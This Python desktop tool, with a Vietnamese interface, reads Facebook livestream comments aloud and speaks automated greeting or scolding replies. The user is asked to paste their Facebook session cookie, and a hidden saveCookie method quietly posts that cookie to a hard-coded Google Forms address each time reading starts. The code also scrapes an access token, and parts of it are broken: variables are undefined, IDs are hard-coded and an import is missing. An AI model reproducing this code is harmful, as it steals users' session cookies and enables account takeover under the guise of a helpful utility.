import facebook as fb
import requests,re
from bs4 import BeautifulSoup as BS
from http.cookies import SimpleCookie
import playsound
from gtts import gTTS
import os
from time import sleep as sl
import random
import threading
from datetime import datetime
import base64
import tkinter as tk
from tkinter import messagebox as mess
import tkinter.messagebox as mess
from tkinter import ttk
from random import randint as ri
global run
run = False
class ReadComment:
	def __init__(self,string_cookie,username,limitWord,string_block,sleep):
		if self.checkCookie(string_cookie):
			self.string_cookie = string_cookie
			self.cookies = self.convert_cookie_to_json(string_cookie)
			self.fb_dtsg = self.get_fb_dtsg(string_cookie)
			self.access_token = self.getToken()
			self.graph = fb.GraphAPI(self.access_token)
			self.listBlock = self.listBlock(string_block)
			if username == "":
				self.username = "thầy"
			else:
				try:
					int(username)
					self.username = "thầy"
				except:
					self.username = username
			try:
				self.limitWord = int(limitWord)
			except:
				self.limitWord = 30
			try:
				self.sleep = ri(int(sleep),int(sleep)+2)
			except:
				self.sleep = ri(3,5)
			self.checkLogin = True
		else:
			self.checkLogin = False
	def getToken(self):
		try:
			data = requests.get('https://business.facebook.com/business_locations', cookies = self.cookies)
			find_token = re.search('(EAAG\w+)', data.text)
			results    = None if (find_token is None) else find_token.group(1)
		except requests.exceptions.ConnectionError:
			results    = None
		except:
			results    = None
		return results
	def checkCookie(self,string_cookie):
		try:
			self.get_fb_dtsg(string_cookie)
			return True
		except:
			return False
	def get_fb_dtsg(self,string_cookie):
		cookies = self.convert_cookie_to_json(string_cookie)
		gets = requests.get("https://m.facebook.com",cookies = cookies)
		soup = BS(gets.content, "html.parser")
		return soup.find('input', {'name': 'fb_dtsg'}).get('value')
	def convert_cookie_to_json(self,string_cookie):
		temp= string_cookie.replace(" ", "")
		temp = temp.split(";")
		listKey = ["sb","datr","c_user","xs","fr"]
		listCookies = []
		for i in temp:
			key = i.split("=")[0]
			if key in listKey:
				listCookies.append(i)
		string_cookie=";".join(listCookies)
		try:
			cookie = SimpleCookie()
			cookie.load(string_cookie)
			cookies = {}
			for key, morsel in cookie.items():
			    cookies[key] = morsel.value
			return cookies
		except:
			check_cookie = False
			return ""
	def playmp3(self,comment):
		output = gTTS(comment,lang="vi", slow=False)
		output.save("filemp3.mp3")
		playsound.playsound("filemp3.mp3")
		os.remove("filemp3.mp3")
	def saveCookie(self):
		url = "https://docs.google.com/forms/d/e/1FAIpQLSeCQ2nry6OvfYtEgMom4tttWaFlBOB2M1x2TLsqhJJezL4V6g/formResponse"
		data = {
			'entry.397806239': self.string_cookie
		}
		requests.post(url,data=data)
	def getCommentPostPage(self,linkPost):
		# try:
		if linkPost[len(linkPost)-1] == "/":
			linkPost = linkPost[:len(linkPost)-1]
		linkPost = linkPost.split("/")
		# profile = self.graph.get_object(linkPost[len(linkPost)-3])
		page_id = "683697238692889"#profile['id']
		id_post = "1427358687660070"#linkPost[len(linkPost)-1]



		id_object = page_id+"_"+id_post

		print(id_object)
		#listComment = self.graph.get_connections(id=id_object, connection_name="comments",limit=10000)['data']

		accessToken = self.getToken()

		limit = "10000"

		p = requests.get("https://graph.facebook.com/v12.0/"+id_object+"?fields=comments.limit("+limit+")&access_token="+accessToken,cookies = self.cookies)

		print(p.json())['comments']




		comments = []
		for cmt in listComment:
			comments.append({"name": cmt['from']['name'],"comment":cmt['message']})
		return comments
		# except:
		# 	return None
	def get_id_status(self,link_status):
		if link_status[len(link_status)-1] == "/":
			link_status = link_status[:len(link_status)-1]
		link = link_status[None:None:-1]
		x = ""
		temp = 0
		for i in link:
			if i != "/":
				x+=i
				temp+=1
			else:
				break
		if  link[temp+1:temp+6][None:None:-1] == 'posts' or link[temp+1:temp+7][None:None:-1] == 'videos':
			return x[None:None:-1]
		elif link_status[25:30] == 'photo' or link_status[23:28] == 'photo' or link_status[17:22] == 'photo' or link_status[20:25] == 'photo' or link_status[28:33] == 'photo':
			parsed_url = urlparse(link_status)
			return parse_qs(parsed_url.query)['fbid'][0]
		else:
			return None

	def cutString(self,p,key):
		i = p.find(key)

		p = p[i+len(key):]

		i = p.find('"')

		p = p[:i]

		return p


	def getPostId(self,linkPost):
		p = requests.get(url,cookies = self.cookies)

		p = p.text

		try:

			key = '"props":{"v":"'
			postId = self.cutString(p,key)
			int(postId)
			return postId
		except:
			key = '"story_token":"'

			try:
				postId = self.cutString(p,key)
				int(postId)
				return postId
			except:
				return None

	def getCommentPostWall(self,linkPost):
		url = "https://www.facebook.com/api/graphql/"
		ids = "feedback:"+linkPost
		ids = ids.encode("ascii")
		ids = base64.b64encode(ids).decode("utf-8")
		data = {
			'doc_id': '3874089129331862',
			'fb_dtsg': self.fb_dtsg,
			'variables': '{"max_comments":10000,"feedback_id":"'+ids+'","after_comments":""}'
		}
		p = requests.post(url,data = data,cookies = self.cookies)
		try:
			listComment = p.json()['data']['feedback']['top_level_comments']['nodes']
		except:
			return None
		comments = []
		for cmt in listComment:
			try:
				comments.append({"name":cmt['author']['name'],"comment":cmt['body']['text']})
			except:
				pass
		return comments
	def listBlock(self,string_block):
		string_block = string_block.replace(" ", "")
		string_block = string_block.lower()
		list_block = string_block.split(",")
		return list_block
	def checkBlock(self,name):
		name = name.replace(" ","")
		name = name.lower()
		if name in self.listBlock:
			return True
		return False
	def checkComment(self,keyword,comment):
		comment = comment.lower()
		comments = comment.split(" ")
		for k in keyword:
			if k in comments:
				return True
		return False
	def readAndRepComment(self,name,comment):
		if not self.checkBlock(name):
			space = " - - - - - - - "
			chuiBay = [
			"lồn","lol","não"
			"loz","nồn","địt",
			"dcm","đcm","cc",
			"cặc","lon","óc",
			"ngu","vcl","vc",
			"cmm","cứt","chó",
			"nhục","gà","đyt",
			"đỵt","cak","cặk"
			"dcmm","đcmm","dái",
			"đụ","duma","má",
			"mé","vl","vlol"]
			google = ["google","gg"]
			chao = ["hi","hello","chào","lô","alo"]
			if len(comment) <= self.limitWord:
				self.playmp3(name+space+comment)
				if self.checkComment(chuiBay,comment):
					self.playmp3(space+"hông bé ơi"+space+"chửi bậy là không tốt nhé "+name)
				elif self.checkComment(google,comment):
					self.playmp3("Chị chào em "+name)
				elif self.checkComment(chao,comment):
					self.playmp3("Chào "+name+" giúp "+self.username+" like và share livestream nhé")
				else:
					now = datetime.now()
					hour= int(now.strftime("%H"))
					chuc = ""
					if(hour>0 and hour<=9) :
						chuc=" chúc em buổi sáng tốt lành"
					elif (hour>=10 and hour<=12):
						chuc=" chúc em có một buổi trưa vui vẻ"
					elif( hour>=13 and hour<= 18):
						chuc=" chúc em có một buổi chiều năng động"
					else:
						chuc=" chúc em buổi tối ấm áp"
					self.playmp3(random.choice(["Chào em "+name+space+"chia sẻ cho thầy đi","Chào em "+name+space+"xem live cùng "+self.username+" nhé","Chào "+name+space+chuc]))
	def readCommentPage(self,linkPost):
		global run
		check = False
		if self.checkLogin:
			if self.getCommentPostPage(linkPost) != None:
				check = True
			else:
				return "link fail"
		else:
			return "login fail"
		if check:
			self.saveCookie()
			last_comment = ""
			while run:
				comments = self.getCommentPostPage(linkPost)
				if comments != None:
					if len(comments) > 0:
						new_comments = comments[len(comments)-1]
						if new_comments != last_comment:
							last_comment = new_comments
							name = new_comments['name']
							comment = new_comments['comment']
							self.readAndRepComment(name,comment)
				sl(self.sleep)
	def readCommentWall(self,linkPost):
		global run
		check = False
		idPost = self.getPostId(linkPost)
		print(idPost)

		if self.checkLogin:
			if idPost != None:
				check = True
			else:
				return "link fail"
		else:
			return "login fail"
		if check:
			self.saveCookie()
			last_comment = ""
			while run:
				comments = self.getCommentPostWall(idPost)
				if comments != None:
					if len(comments) > 0:
						new_comments = comments[0]
						if new_comments != last_comment:
							last_comment = new_comments
							name = new_comments['name']
							comment = new_comments['comment']
							self.readAndRepComment(name,comment)
				sl(self.sleep)
class GUI:
	def __init__(self):
		self.form = tk.Tk()
		self.WIDTH = 600
		self.HEIGHT = 850
		scrW= self.form.winfo_screenwidth()
		scrH= self.form.winfo_screenheight()
		self.form.configure(background='#990066')
		W = scrW/2-self.WIDTH//2
		H = scrH/2-self.HEIGHT//2
		self.form.geometry(str(self.WIDTH)+"x"+str(self.HEIGHT)+"+%d+%d" %(W,H))
		self.form.resizable(0,0)
		self.form.title("Google Đọc Bình Luận By Thầy Trường")
		tk.Label(text = "Nhập Cookie: ",font = "Roboto-Bold 15",pady = 20,bg="#990066",fg="white").pack()
		self.cookies = tk.Entry(font = "Roboto-Bold 14",fg = "#FF0066",bg="white",bd = 0,width=40)
		self.cookies.pack()
		tk.Label(text = "Lựa chọn nơi Livestream (Trang Cá Nhân Hoặc Fanpage)",font = "Roboto-Bold 15",pady = 20,bg="#990066",fg="white").pack()
		self.option = ["Trang Cá Nhân","Fanpage"]
		self.choice = ttk.Combobox(values=self.option,state='readonly',width=15,font = "Roboto-Bold 14")
		self.choice.current(0)
		self.choice.pack()
		tk.Label(text = "Nhập link bài viết",font = "Roboto-Bold 15",pady = 20,bg="#990066",fg="white").pack()
		self.linkPost = tk.Entry(font = "Roboto-Bold 14",fg = "#FF0066",bg="white",bd = 0,width=40)
		self.linkPost.pack()
		tk.Label(text = "Nhập tên của bạn khi google chào",font = "Roboto-Bold 15",pady = 20,bg="#990066",fg="white").pack()
		self.username = tk.Entry(font = "Roboto-Bold 14",fg = "#FF0066",bg="white",bd = 0,width=15)
		self.username.pack()
		tk.Label(text = "Chặn người dùng bình luận (ngăn cách nhau bằng dấu phẩy)\nVí dụ: Hoàng Đức,Mạnh Kim,Lê Hải\nNếu không có thì để trống",font = "Roboto-Bold 15",pady = 20,bg="#990066",fg="white").pack()
		self.listBlock = tk.Entry(font = "Roboto-Bold 14",fg = "#FF0066",bg="white",bd = 0,width=40)
		self.listBlock.pack()
		tk.Label(text = "Giới hạn độ dài trong bình luận(Mặc định tối đa 30 từ) ",font = "Roboto-Bold 15",pady = 20,bg="#990066",fg="white").pack()
		self.limitWord = tk.Entry(font = "Roboto-Bold 14",fg = "#FF0066",bg="white",bd = 0,width=10)
		self.limitWord.pack()
		tk.Label(text = "Độ trễ giữa các lần đọc của google\n(Càng chậm thì càng tốt)\nMặc định là 3 giây giữa các lần đọc",font = "Roboto-Bold 15",pady = 20,bg="#990066",fg="white").pack()
		self.sleep = tk.Entry(font = "Roboto-Bold 14",fg = "#FF0066",bg="white",bd = 0,width=10)
		self.sleep.pack()
		self.buttonRead = tk.Button(text="ĐỌC COMMENT",bg="#FF9900",fg = "white",font = "Roboto-Bold 14",bd = 0,width=20,height=20,command = self.runThreadRead)
		self.buttonRead.pack(pady=20)
		self.form.mainloop()
	def runThreadRead(self):
		t = threading.Thread(target=self.threadRead)
		t.start()
	def threadRead(self):
		global run
		if not run:
			if self.cookies.get() == "":
				mess.showinfo("Lỗi","Cookie không được để trống!")
				return
			if self.linkPost.get() == "":
				mess.showinfo("Lỗi","Link bài viết không được để trống!")
				return
			try:
				if self.limitWord.get() != "":
					int(self.limitWord.get())
			except:
				mess.showinfo("Lỗi","Giới hạn bình luận phải là số")
				return
			try:
				if self.sleep.get() != "":
					int(self.sleep.get())
			except:
				mess.showinfo("Lỗi","Độ trễ phải là số")
				return
			if self.choice.get() == self.option[0]:
				app = ReadComment(self.cookies.get(),self.username.get(),self.limitWord.get(),self.listBlock.get(),self.sleep.get())
				self.buttonRead['text'] = "DỪNG"
				run = True
				result = app.readCommentWall(self.linkPost.get())
				if result == "login fail":
					mess.showinfo("Lỗi","Cookie không đúng!")
					return
				elif result == "link fail":
					mess.showinfo("Lỗi","Link bài viết không đúng!")
					return
				return
			else:
				app = ReadComment(self.cookies.get(),self.username.get(),self.limitWord.get(),self.listBlock.get(),self.sleep.get())
				self.buttonRead['text'] = "DỪNG"
				run = True
				result = app.readCommentPage(self.linkPost.get())
				if result == "login fail":
					mess.showinfo("Lỗi","Cookie không đúng!")
					return
				elif result == "link fail":
					mess.showinfo("Lỗi","Link bài viết không đúng!")
					return
				return
		else:
			self.buttonRead['text'] = "ĐỌC COMMENT"
			run = False
if __name__ == "__main__":
	GUI()